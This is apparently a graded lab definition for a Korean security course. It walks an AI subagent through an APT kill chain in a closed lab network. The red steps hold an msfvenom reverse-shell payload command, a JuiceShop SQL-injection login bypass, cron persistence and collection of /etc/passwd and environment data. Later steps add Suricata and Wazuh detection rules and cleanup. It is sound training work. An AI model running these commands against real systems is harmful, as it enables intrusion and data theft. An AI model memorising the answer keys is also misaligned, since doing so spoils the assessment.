lab_id: battle-adv-ai-week01
title: APT 킬체인 시뮬레이션 — 정찰부터 목표 달성까지 (AI 지원)
version: ai
course: battle-adv-ai
week: 1
description: APT(Advanced Persistent Threat) 공격의 전체 킬체인을 단일 인프라에서 시뮬레이션한다. MITRE ATT&CK
  프레임워크를 기반으로 Reconnaissance → Weaponization → Delivery → Exploitation → Installation
  → C2 → Actions 7단계를 실습하고, 각 단계의 탐지 포인트를 식별한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: hard
duration_minutes: 150
objectives:
- APT 킬체인 7단계를 이해하고 각 단계별 기법을 실습한다
- MITRE ATT&CK 매트릭스에 공격 기법을 매핑한다
- 각 킬체인 단계에서의 탐지 포인트를 식별한다
prerequisites:
- battle-nonai 과정 전체 이수
- MITRE ATT&CK 프레임워크 기본 이해
- Linux 시스템 관리 중급 수준
infra_requirements:
- attacker (10.20.30.201) — nmap, metasploit, sqlmap, hydra, nikto
- secu (10.20.30.1) — nftables, suricata
- web (10.20.30.80) — apache, modsecurity, JuiceShop(:3000), DVWA(:8080)
- siem (10.20.30.100) — wazuh-manager
pass_threshold: 0.6
steps:
- order: 1
  instruction: '[RED] APT 정찰 단계 — 타겟 네트워크 10.20.30.0/24에서 서비스 배너와 OS를 동시에 탐지하라. 스텔스
    SYN 스캔과 서비스 버전 탐지를 결합하고 결과를 XML로 저장하라.'
  hint: -sS -sV -O 옵션을 조합하고 --script=banner도 추가한다.
  category: recon
  points: 10
  answer: sudo nmap -sS -sV -O --script=banner --max-retries 1 --host-timeout 15s
    -T4 10.20.30.0/24 -oX /tmp/apt_recon.xml
  answer_detail: APT 시뮬레이션의 Reconnaissance 단계이다. -sS(SYN 스캔)는 TCP 3-way handshake를
    완료하지 않아 로그에 남기 어렵고, -sV는 서비스 버전을, -O는 OS를 탐지한다. XML 출력은 Metasploit에서 import 가능하다.
  verify:
    type: file_exists
    expect: /tmp/apt_recon.xml
    field: filesystem
  target_vm: attacker
  script: sudo nmap -sS -sV -O --script=banner --max-retries 1 --host-timeout 15s
    -T4 10.20.30.0/24 -oX /tmp/apt_recon.xml
  risk_level: low
  bastion_prompt: '[RED] APT 정찰 단계 — 타겟 네트워크 10.20.30.0/24에서 서비스 배너와 OS를 동시에 탐지해줘'
- order: 2
  instruction: '[RED] 수집된 정보를 기반으로 웹 서버(10.20.30.80)의 보안 헤더와 취약점 징후를 점검하라. HTTP 보안
    헤더를 분석하고, nmap의 vuln 스크립트로 알려진 취약점을 탐색하라.'
  hint: curl -sI로 보안 헤더를 확인하고, nmap --script vuln으로 취약점을 탐색한다.
  category: recon
  points: 10
  answer: echo "=== HTTP Security Headers ===" && curl -sI http://10.20.30.80 | grep
    -iE "(Server|X-Powered-By|X-Frame|X-Content-Type|Strict-Transport|Content-Security)"
    && echo "=== Missing headers indicate weak config ===" && echo "" && echo "===
    Nmap vuln scan ===" && nmap --script vuln -p 80,3000,8080 --max-retries 1 --host-timeout
    15s -T4 10.20.30.80 2>/dev/null | head -40
  answer_detail: Weaponization 준비 단계로, HTTP 보안 헤더 부재와 nmap vuln 스크립트로 알려진 취약점을 탐색한다.
    X-Frame-Options, Content-Security-Policy 등의 부재는 XSS, Clickjacking 등의 공격 가능성을 나타낸다.
  verify:
    type: output_contains
    expect: HTTP Security Headers
  target_vm: attacker
  script: echo "=== HTTP Security Headers ===" && curl -sI http://10.20.30.80 | grep
    -iE "(Server|X-Powered-By|X-Frame|X-Content-Type|Strict-Transport|Content-Security)"
    && echo "=== Missing headers indicate weak config ===" && echo "" && echo "===
    Nmap vuln scan ===" && nmap --script vuln -p 80,3000,8080 --max-retries 1 --host-timeout
    15s -T4 10.20.30.80 2>/dev/null | head -40
  risk_level: low
  bastion_prompt: '[RED] 수집된 정보를 기반으로 웹 서버(10.20.30.80)의 보안 헤더와 취약점 징후를 점검하라. HTTP
    보안 헤더를 분석하고, nmap의 vuln 스크립트로 알려진 취약점을 탐색해줘'
- order: 3
  instruction: '[RED] Weaponization — msfvenom으로 리버스 쉘 페이로드를 생성하라. Linux ELF 바이너리
    형태로 생성하되 실행하지 말고 저장만 하라.'
  hint: msfvenom -p linux/x64/shell_reverse_tcp 옵션을 사용한다.
  category: exploit
  points: 10
  answer: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f
    elf -o /tmp/apt_payload.elf && file /tmp/apt_payload.elf && echo "Payload generated
    (SAVE ONLY - do not execute)"
  answer_detail: APT의 Weaponization 단계에서 공격자는 exploit 페이로드를 제작한다. msfvenom은 Metasploit의
    페이로드 생성 도구로, ELF 바이너리 형태의 리버스 쉘을 생성한다. 실습에서는 페이로드 구조를 이해하기 위해 생성만 하고 실행하지 않는다.
  verify:
    type: file_exists
    expect: /tmp/apt_payload.elf
    field: filesystem
  target_vm: attacker
  script: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f
    elf -o /tmp/apt_payload.elf && file /tmp/apt_payload.elf && echo "Payload generated
    (SAVE ONLY - do not execute)"
  risk_level: medium
  bastion_prompt: '[RED] Weaponization — msfvenom으로 리버스 쉘 페이로드를 생성하라. Linux ELF 바이너리
    형태로 생성하되 실행하지 말고 저장만 해줘'
- order: 4
  instruction: '[RED] Exploitation — JuiceShop(10.20.30.80:3000)의 로그인 엔드포인트에 SQL Injection을
    수행하여 인증을 우회하라.'
  hint: REST API에 JSON 형태로 SQL Injection 페이로드를 전송한다.
  category: exploit
  points: 10
  answer: "curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type:\
    \ application/json' \\\n  -d '{\"email\":\"\\\" OR 1=1--\",\"password\":\"test\"\
    }' \\\n | python3 -m json.tool"
  answer_detail: Exploitation 단계에서 SQL Injection(T1190)으로 인증을 우회한다. JuiceShop의 로그인
    폼에 SQL 구문을 삽입하여 admin 토큰을 획득한다. 이 기법은 OWASP Top 10의 A03:2021-Injection에 해당한다.
  verify:
    type: output_contains
    expect: token
  target_vm: attacker
  script: "curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type:\
    \ application/json' \\\n  -d '{\"email\":\"\\\" OR 1=1--\",\"password\":\"test\"\
    }' \\\n | python3 -m json.tool"
  risk_level: medium
  bastion_prompt: '[RED] Exploitation — JuiceShop(10.20.30.80:3000)의 로그인 엔드포인트에 SQL
    Injection을 수행하여 인증을 우회해줘'
- order: 5
  instruction: '[RED] Installation(Persistence) — crontab을 이용한 지속성 확보를 시뮬레이션하라. 무해한
    echo 명령으로 시뮬레이션한다.'
  hint: crontab에 비컨 시뮬레이션 명령을 등록한다.
  category: exploit
  points: 10
  answer: echo '*/5 * * * * /bin/bash -c "echo APT_PERSISTENCE_TEST > /tmp/apt_persist.txt"'
    | crontab - && crontab -l | grep APT_PERSISTENCE
  answer_detail: Installation 단계에서 Persistence 메커니즘을 설치한다(T1053.003). crontab은 시스템
    재부팅 후에도 유지되는 지속성 기법이다. 실습에서는 무해한 echo 명령으로 시뮬레이션한다.
  verify:
    type: output_contains
    expect: APT_PERSISTENCE
  target_vm: attacker
  script: echo '*/5 * * * * /bin/bash -c "echo APT_PERSISTENCE_TEST > /tmp/apt_persist.txt"'
    | crontab - && crontab -l | grep APT_PERSISTENCE
  risk_level: medium
  bastion_prompt: '[RED] Installation(Persistence) — crontab을 이용한 지속성 확보를 시뮬레이션해줘'
- order: 6
  instruction: '[RED] C2 시뮬레이션 — DNS 기반 C2 통신을 모방하여 base64 인코딩 데이터를 DNS 쿼리에 포함하라.
    그 후 수집한 시스템 정보를 /tmp/apt_exfil.txt에 저장하라.'
  hint: base64로 데이터를 인코딩한 후 서브도메인으로 구성하여 DNS 쿼리를 보낸다.
  category: exploit
  points: 10
  answer: echo 'APT_C2_DATA' | base64 | tr -d '=' | xargs -I{} nslookup {}.test.local
    2>&1 | head -5 && cat /etc/passwd > /tmp/apt_exfil.txt && env >> /tmp/apt_exfil.txt
    && ip addr >> /tmp/apt_exfil.txt && wc -l /tmp/apt_exfil.txt
  answer_detail: C2 단계에서 DNS 기반 통신(T1071.004)을 시뮬레이션한다. DNS 프로토콜은 거의 모든 방화벽에서 허용되므로
    탐지가 어렵다. Actions on Objectives로 시스템 정보를 수집(T1005)하여 유출 준비를 한다.
  verify:
    type: file_exists
    expect: /tmp/apt_exfil.txt
    field: filesystem
  target_vm: attacker
  script: echo 'APT_C2_DATA' | base64 | tr -d '=' | xargs -I{} nslookup {}.test.local
    2>&1 | head -5 && cat /etc/passwd > /tmp/apt_exfil.txt && env >> /tmp/apt_exfil.txt
    && ip addr >> /tmp/apt_exfil.txt && wc -l /tmp/apt_exfil.txt
  risk_level: medium
  bastion_prompt: '[RED] C2 시뮬레이션 — DNS 기반 C2 통신을 모방하여 base64 인코딩 데이터를 DNS 쿼리에 포함해줘'
- order: 7
  instruction: '[BLUE] Phase 전환 — Suricata IDS에서 APT 공격에 대한 커스텀 탐지 규칙을 작성하라. SQL Injection,
    포트 스캔, DNS 터널링을 탐지하는 규칙을 /tmp/apt_detection.rules에 저장하라.'
  hint: alert http/tcp/dns 규칙으로 각 공격 유형을 탐지한다.
  category: defense
  points: 10
  answer: cat > /tmp/apt_detection.rules << 'EOF' alert http any any -> 10.20.30.0/24
    any (msg:"APT-SIM SQLI Attempt"; flow:to_server,established; content:"UNION";
    nocase; content:"SELECT"; nocase; distance:0; within:20; sid:9100001; rev:1;)
    alert tcp any any -> 10.20.30.0/24 any (msg:"APT-SIM Reverse Shell Port"; flow:established;
    dport:4444; sid:9100002; rev:1;) alert dns any any -> any any (msg:"APT-SIM DNS
    Tunneling - Long Query"; dns.query; pcre:"/^[a-zA-Z0-9+\/]{30,}/"; sid:9100003;
    rev:1;) EOF cat /tmp/apt_detection.rules
  answer_detail: Blue Phase에서 Suricata 커스텀 규칙을 작성한다. SQL Injection 탐지(UNION SELECT
    패턴), 리버스 쉘 포트(4444) 연결 탐지, DNS 터널링(30자 이상 base64 패턴) 탐지를 구현한다.
  verify:
    type: output_contains
    expect: APT-SIM
  target_vm: secu
  script: cat > /tmp/apt_detection.rules << 'EOF' alert http any any -> 10.20.30.0/24
    any (msg:"APT-SIM SQLI Attempt"; flow:to_server,established; content:"UNION";
    nocase; content:"SELECT"; nocase; distance:0; within:20; sid:9100001; rev:1;)
    alert tcp any any -> 10.20.30.0/24 any (msg:"APT-SIM Reverse Shell Port"; flow:established;
    dport:4444; sid:9100002; rev:1;) alert dns any any -> any any (msg:"APT-SIM DNS
    Tunneling - Long Query"; dns.query; pcre:"/^[a-zA-Z0-9+\/]{30,}/"; sid:9100003;
    rev:1;) EOF cat /tmp/apt_detection.rules
  risk_level: low
  bastion_prompt: secu VM(보안게이트웨이)에서 cat으로 [BLUE] Phase 전환 — Suricata IDS에서 APT 공격에
    대한 커스텀 탐지 규칙 작업을 수행해줘
- order: 8
  instruction: '[BLUE] Wazuh SIEM에서 APT 킬체인을 탐지하기 위한 상관 분석 규칙을 작성하라. 5분 내 3개 이상 공격
    지표가 감지되면 CRITICAL 알림을 발생시키는 규칙을 만들어라.'
  hint: Wazuh의 composite rule 문법으로 frequency와 timeframe을 설정한다.
  category: defense
  points: 10
  answer: "cat > /tmp/wazuh_apt_rule.xml << 'EOF'\n<group name=\"apt_killchain\">\n\
    \  <rule id=\"100100\" level=\"14\" frequency=\"3\" timeframe=\"300\">\n    <if_matched_group>apt_indicator</if_matched_group>\n\
    \    <description>APT Kill Chain: 3+ attack indicators in 5 minutes</description>\n\
    \    <mitre>\n      <id>T1190</id>\n      <id>T1053</id>\n      <id>T1071</id>\n\
    \    </mitre>\n  </rule>\n  <rule id=\"100101\" level=\"10\">\n    <if_sid>31103</if_sid>\n\
    \    <match>UNION|SELECT|OR 1=1</match>\n    <group>apt_indicator</group>\n  \
    \  <description>APT Indicator: SQL Injection attempt</description>\n  </rule>\n\
    \  <rule id=\"100102\" level=\"10\">\n    <if_sid>550</if_sid>\n    <match>crontab</match>\n\
    \    <group>apt_indicator</group>\n    <description>APT Indicator: Crontab modification</description>\n\
    \  </rule>\n</group>\nEOF\ncat /tmp/wazuh_apt_rule.xml"
  answer_detail: Wazuh 상관 분석 규칙은 개별 이벤트를 연결하여 APT 킬체인을 탐지한다. frequency와 timeframe으로
    시간 윈도우 내 이벤트 빈도를 추적하며, MITRE ATT&CK ID를 태깅하여 공격 기법을 분류한다.
  verify:
    type: output_contains
    expect: apt_killchain
  target_vm: siem
  script: "cat > /tmp/wazuh_apt_rule.xml << 'EOF'\n<group name=\"apt_killchain\">\n\
    \  <rule id=\"100100\" level=\"14\" frequency=\"3\" timeframe=\"300\">\n    <if_matched_group>apt_indicator</if_matched_group>\n\
    \    <description>APT Kill Chain: 3+ attack indicators in 5 minutes</description>\n\
    \    <mitre>\n      <id>T1190</id>\n      <id>T1053</id>\n      <id>T1071</id>\n\
    \    </mitre>\n  </rule>\n  <rule id=\"100101\" level=\"10\">\n    <if_sid>31103</if_sid>\n\
    \    <match>UNION|SELECT|OR 1=1</match>\n    <group>apt_indicator</group>\n  \
    \  <description>APT Indicator: SQL Injection attempt</description>\n  </rule>\n\
    \  <rule id=\"100102\" level=\"10\">\n    <if_sid>550</if_sid>\n    <match>crontab</match>\n\
    \    <group>apt_indicator</group>\n    <description>APT Indicator: Crontab modification</description>\n\
    \  </rule>\n</group>\nEOF\ncat /tmp/wazuh_apt_rule.xml"
  risk_level: low
  bastion_prompt: siem VM(Wazuh)에서 cat으로 [BLUE] Wazuh SIEM에서 APT 킬체인을 탐지하기 위한 상관 분석
    규칙 작업을 수행해줘
- order: 9
  instruction: '[BLUE] 공격자의 auth.log에서 APT 활동 흔적을 분석하라. 비정상 인증 시도 패턴을 검색하고, MITRE
    ATT&CK Navigator 레이어 JSON 파일을 생성하라.'
  hint: grep으로 Failed/Accepted 패턴을 검색하고, ATT&CK 레이어 JSON을 작성한다.
  category: defense
  points: 10
  answer: grep -E "(Failed|Accepted|session opened|Invalid user)" /var/log/auth.log
    | tail -20 && cat > /tmp/apt_attack_layer.json << 'EOF' {"name":"APT Simulation
    Lab","versions":{"attack":"14","navigator":"4.9","layer":"4.5"},"domain":"enterprise-attack","techniques":[{"techniqueID":"T1595","score":1,"comment":"Active
    Scanning"},{"techniqueID":"T1190","score":1,"comment":"Exploit Public-Facing App"},{"techniqueID":"T1053.003","score":1,"comment":"Cron
    Persistence"},{"techniqueID":"T1071.004","score":1,"comment":"DNS C2"},{"techniqueID":"T1005","score":1,"comment":"Data
    from Local System"}]} EOF python3 -m json.tool /tmp/apt_attack_layer.json | head
    -10
  answer_detail: 로그 분석과 ATT&CK 매핑은 방어자의 핵심 역량이다. auth.log에서 공격 흔적을 추적하고, ATT&CK Navigator
    JSON 레이어를 생성하여 킬체인 각 단계를 시각적으로 매핑한다.
  verify:
    type: output_contains
    expect: enterprise-attack
  target_vm: attacker
  script: grep -E "(Failed|Accepted|session opened|Invalid user)" /var/log/auth.log
    | tail -20 && cat > /tmp/apt_attack_layer.json << 'EOF' {"name":"APT Simulation
    Lab","versions":{"attack":"14","navigator":"4.9","layer":"4.5"},"domain":"enterprise-attack","techniques":[{"techniqueID":"T1595","score":1,"comment":"Active
    Scanning"},{"techniqueID":"T1190","score":1,"comment":"Exploit Public-Facing App"},{"techniqueID":"T1053.003","score":1,"comment":"Cron
    Persistence"},{"techniqueID":"T1071.004","score":1,"comment":"DNS C2"},{"techniqueID":"T1005","score":1,"comment":"Data
    from Local System"}]} EOF python3 -m json.tool /tmp/apt_attack_layer.json | head
    -10
  risk_level: low
  bastion_prompt: '[BLUE] 공격자의 auth.log에서 APT 활동 흔적을 분석해줘'
- order: 10
  instruction: '[RED/BLUE] 환경 정리 및 킬체인 분석 보고서 작성 — Persistence를 제거하고, 킬체인 7단계의 기법,
    ATT&CK 매핑, 탐지 포인트를 /tmp/apt_killchain_report.txt에 정리하라.'
  hint: crontab -r로 크론탭을 초기화하고, 킬체인 7단계를 ATT&CK ID와 매핑한다.
  category: analysis
  points: 15
  answer: 'crontab -r 2>/dev/null; rm -f /tmp/apt_payload.elf /tmp/apt_exfil.txt /tmp/apt_persist.txt
    2>/dev/null && cat > /tmp/apt_killchain_report.txt << ''EOF'' === APT Kill Chain
    Analysis Report === Date: 2026-04-06 Target: 10.20.30.0/24

    1. Reconnaissance (T1595): Nmap SYN+Version scan -> Detect: IDS port scan rule
    -> Defend: Minimize ports 2. Weaponization (T1587): msfvenom ELF payload -> Detect:
    Sandbox analysis -> Defend: Application whitelisting 3. Delivery (T1566.001):
    HTTP hosting simulation -> Detect: URL filtering -> Defend: Email security gateway
    4. Exploitation (T1190): SQL Injection on JuiceShop -> Detect: WAF/IDS logs ->
    Defend: Parameterized queries 5. Installation (T1053.003): Crontab Persistence
    -> Detect: FIM + crontab monitoring -> Defend: Cron whitelist 6. C2 (T1071.004):
    DNS-based C2 -> Detect: DNS entropy analysis -> Defend: DNS filtering 7. Actions
    (T1005): Data collection -> Detect: DLP -> Defend: Data classification

    Conclusion: Defense-in-Depth is essential - every kill chain stage offers a detection
    opportunity. EOF cat /tmp/apt_killchain_report.txt && echo "--- Cleanup completed
    ---"'
  answer_detail: 환경 복원 후 킬체인 각 단계의 ATT&CK 매핑과 탐지/방어 포인트를 정리한다. 7단계 모두에서 탐지 기회가 있으며,
    심층 방어(Defense-in-Depth) 전략이 핵심이다.
  verify:
    type: output_contains
